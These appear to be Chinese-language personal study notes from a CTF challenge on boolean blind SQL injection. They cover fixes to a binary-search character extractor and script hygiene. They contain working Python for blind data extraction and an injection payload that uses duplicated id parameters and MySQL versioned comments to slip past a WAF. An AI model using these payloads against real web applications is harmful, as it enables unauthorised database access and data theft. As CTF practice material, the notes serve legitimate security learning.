## 二、知识点

### 1. 二分盲注必须带"相等回退"，否则边界字符会漏

原来的写法：

```python
low, high = 32, 127
while low < high:
    mid = (low + high) // 2
    if is_true(f"...>{mid}..."):  low = mid + 1
    else:                          high = mid
```

问题在于它只问"大于吗"。当目标字符恰好等于 `mid` 时，`>mid` 为假，`high` 被压到 `mid`，区间把那个值**收掉了**，最后 `chr(low)` 拿到的不是原字符。

改法：区间用 `low <= high`，`>mid` 走左半，否则**再单独问一次 `=mid`**，相等才定字符、`break`；`>` 与 `=` 都假才往左收。多花一次请求换正确性，值得。

### 2. ASCII 上界是 126，不是 127

可打印字符到 `~`（126）。写 127 把 DEL 算进来，区间变大，且理论上可能吐出不可见字符，判题时看不出来。

### 3. 脚本要可重跑：目标和查询表达式分离

`sqlAUTO.py` 把易变的参数提到配置区：

```python
url = "http://...challenge.ctfplus.cn"
true_keyword = "该书存在于书架之上"
max_length = 500
timeout = 5
```

查询表达式作为参数传进 `get_data()`。换题只改配置，逻辑一行不动。原来的版本把 URL 和关键词写死在函数里，换实例就要改代码。

### 4. `requests` 不写 timeout 就是无限等

盲注一题几百次请求，只要有一次挂住，整轮就废了，而且看不出是卡在网络上还是页面本来就慢。`timeout=5` 是底线，配合 `try/except` 才不会让脚本静默停住。

## 三、案例 / 命令

### 1. 二分核心（现版）

```python
def get_data(expr, frm):
    result = ""
    pos = 1
    while pos <= 44:
        low, high = 32, 126
        found = False
        while low <= high:
            mid = (low + high) // 2
            if is_true(f"if((/*!select*/ ascii(substr({expr},{pos},1)) {frm})>{mid},1,0)=1"):
                low = mid + 1
            else:
                if is_true(f"if((/*!select*/ ascii(substr({expr},{pos},1)) {frm})={mid},1,0)=1"):
                    result += chr(mid)
                    found = True
                    break
                high = mid - 1
        if not found:
            break
        pos += 1
    return result
```

### 2. 判真函数（HPP + WAF 绕过都在这一行里）

```python
def is_true(cond):
    val = f"0' OR ({cond}) OR '1'='2"
    url = f"{base}?id=6&id={quote(val, safe='/*!()=*>,;:+-')}"
    return "该书存在于书架之上" in requests.get(url, timeout=5).text
```

`id` 出现两次是给 WAF 和 PHP 各看一个；`quote` 的 `safe` 里留着 `/*!` 是让 `/*!50000select*/` 原样发出去。

## 四、踩坑

| 问题 | 原因 | 解决 |
|---|---|---|
| 二分偶尔吐错字符 | 只问 `>mid`，相等值被区间收缩跳过 | 加 `=mid` 相等回退 |
| 上界写成 127 | DEL 不该进可打印范围 | 改 126 |
| 盲注跑到一半不动了 | `requests.get` 没设超时 | `timeout=5` |
| 三份备份看不出各自改了什么 | 命名只标"替换前""22 行前" | 以后按改动内容命名，如 `_加timeout前` |
| `touch -L` 没生成文件 | `touch` 把 `-L` 当选项 | `touch ./-L`（术之尽头那道） |
